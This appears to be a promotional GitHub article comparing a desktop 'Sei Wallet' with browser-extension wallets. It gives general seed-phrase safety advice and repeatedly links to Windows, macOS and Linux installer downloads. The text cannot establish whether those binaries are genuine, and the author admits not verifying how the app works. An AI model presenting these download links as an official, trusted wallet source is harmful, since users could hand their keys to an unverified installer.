![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">A desktop Sei Wallet or a browser extension: which to use</h1>

<p align="center">Two ways to hold SEI, and the trade each one makes in practice.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

For most people the desktop Sei Wallet is the safer default, because the signing request comes from outside the browser instead of from the page itself. A browser extension lives inside the page and signs when a website asks; a desktop application lives outside the browser and signs when you bring a transaction to it. That single difference decides most of what follows - the convenience, the exposure, and the kind of mistake each shape invites.

Sei Wallet is a desktop application. The extension route means a different wallet, usually a general EVM one, with Sei added as a network.

## What each shape actually is

**A desktop application** is an installed program with its own window, its own updater and its own storage for encrypted keys. It does not inject anything into web pages, so a website cannot raise a signing prompt in it; you move funds or approve a transaction from inside the app.

**A browser extension** is a small program that runs inside the browser and exposes a provider object to pages. When a site asks to connect, the extension's popup appears. That is why extensions feel seamless with web applications and why they are the default for DeFi use.

Neither shape is safe by itself. Each removes one class of risk and adds another.

## Side by side

<div align="center">

| | Desktop application | Browser extension |
|---|---|---|
| Signing prompt origin | Inside the app, on your initiative | Injected provider, on a site's request |
| Exposure to malicious pages | Low - no page-level hook | Direct - the page can request signatures |
| Update surface | Whole application, from the vendor's domain | Extension package from a store |
| Typical failure mode | Fake installer | Fake extension listing |
| Multi-chain support | Single chain (Sei) | Usually many |
| Built-in staking | Yes | Usually requires a separate interface |
| Hardware wallet | Supported | Supported, often through the same app |
| Mobile | No | Depends on the wallet |

</div>

The row that matters most is the first. A signing prompt that a page can raise is convenient precisely because it is easy to trigger - including by a site you did not mean to visit.

## The security trade, stated honestly

**A desktop app narrows one attack surface and widens another.** There is no injected provider, so drive-by signing requests are not a thing; you cannot be walked into approving a transaction by a page that simply asks. But you are installing a full application from a website, and that installer is the whole attack: a lookalike build runs normally while doing something else. The mitigation is verifying the source before the first run, which is the same discipline whether you install a wallet or a browser.

**An extension narrows the install problem and widens the page problem.** Store distribution means an update path you did not have to arrange, and it also means impersonating listings, malicious "helper" extensions that read page data, and a provider that any site can call. You approve more transactions, more often, in a smaller window, with less context.

Neither shape protects you from a seed phrase typed into a website. That failure is identical in both.

Sei Wallet describes its builds as audited and signed, with the report in the project's audit repository; [the safety guide](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) sets out what that covers. It is a property of the software, not of the desktop-versus-extension question, and it does not change whichever shape you pick.

## What this product actually is

Three facts decide most of the practical questions:

1. **It is a desktop application.** There is a download for desktop platforms, and the product is built around that form.
2. **It signs EVM transactions natively**, with read-only display of legacy Cosmos addresses.
3. **Staking is built in**, including the validator picker and unbonding.

The shape of the product is covered in [this desktop app](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md), and the setup itself in [the Sei Wallet setup guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md).

One thing I did not verify: how this desktop application connects to web applications, whether through a handoff protocol, a pairing code, or not at all. The product's own documentation is the place to check, and I would rather say that than describe a flow I did not confirm.

## When the extension is the better answer

- **Your activity is mostly web applications.** Lending, trading and NFT sites expect an injected provider. A desktop app that has to hand off every request is friction you will resent.
- **You want one wallet for several chains.** A general EVM wallet covers Sei and everything else; a single-chain desktop app does not.
- **You already run one and do not want a second seed exposure.** Every additional app you import a phrase into is another place that phrase can leak from.

## When the desktop app is the better answer

- **You hold SEI and mostly stake, send and receive.** Staking built into the same window, with the unbonding state visible, is the shortest path.
- **You want fewer signing prompts in your life.** No injected provider means no site-initiated prompts.
- **You want one chain and one interface**, without a network switcher and its associated mistakes.

## The mistake each shape invites

**Desktop:** installing the wrong build. The application is only as trustworthy as the file you ran, and a desktop download is a single binary that can be replaced. Verify the source before the first launch, every time.

**Extension:** approving a request from a site you did not mean to be on. The prompt looks the same everywhere, and the window is small. Read the recipient and the amount; the interface will not warn you that the site is new.

A third mistake belongs to both: assuming the wallet's own interface is the authority on an address. It is not. The device screen, for hardware, and your own written record are better references.

## Using both, without doubling the risk

Running both is common and legitimate, and it has one rule: **each app you import a seed into is another place the seed can leak from.** If you use the same phrase in both, you have two copies of the same secret in two different threat models.

Three ways to do it more safely:

- **Separate phrases for separate purposes.** A desktop wallet for the balance you stake, an extension wallet for the small balance you use with web applications. Losing the small one is survivable.
- **Import once, then stop.** Avoid re-importing the phrase repeatedly; each entry is a chance to mistype it into something that is not the wallet.
- **Remove what you do not use.** A dormant wallet you installed to try is still an attack surface.

Restoring an existing phrase into a second application reproduces your existing accounts, which is convenient and also means the second app now has access to the same funds. The mechanics, including what to expect when the addresses look different afterwards, are in [the Sei Wallet restore guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md).

## If you are choosing between ecosystems, not shapes

The desktop-versus-extension question is one axis. The other is which ecosystem's wallet you want, and a Cosmos-first wallet is a genuinely different answer rather than a different packaging: it produces `sei1...` addresses, it talks to a different app on a Ledger, and it covers many chains. That comparison is in [the Cosmos wallet comparison](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md).

There is also a third category - an in-app or hosted wallet, where the key handling is not in your hands the same way. It is not a build of the same product under a different name, and treating the two names as interchangeable is how people end up with an account nobody can help them recover.

## Frequently asked questions

**Is a desktop wallet better than a browser extension?** Neither, in general. A desktop app keeps signing out of the page; an extension keeps signing a click away from any site. Pick the one whose failure mode you are better at avoiding.

**Is there a Sei Wallet browser extension?** The product is a desktop application. If you want an extension, you are choosing a different wallet, not a different build of this one.

**Which is safer for a large balance?** Whichever one you pair with a hardware wallet, and neither if the seed is stored carelessly. The shape matters less than the seed handling.

**Can I use both with the same seed?** Yes, and it doubles your exposure. Consider separate phrases for the two roles instead.

**Does the desktop app work with web applications?** That is a product detail I did not verify here; check the operator's own documentation rather than a summary.

**Do I need a browser extension to stake?** No. Staking is built into the desktop application, and delegation is a chain action either way.

**Which one has better hardware wallet support?** Both can use a hardware wallet; what differs is which app on the device is used, and that is where address mismatches come from.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [How to create a Sei wallet and what the setup asks for](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md)
- [Importing an existing wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md)
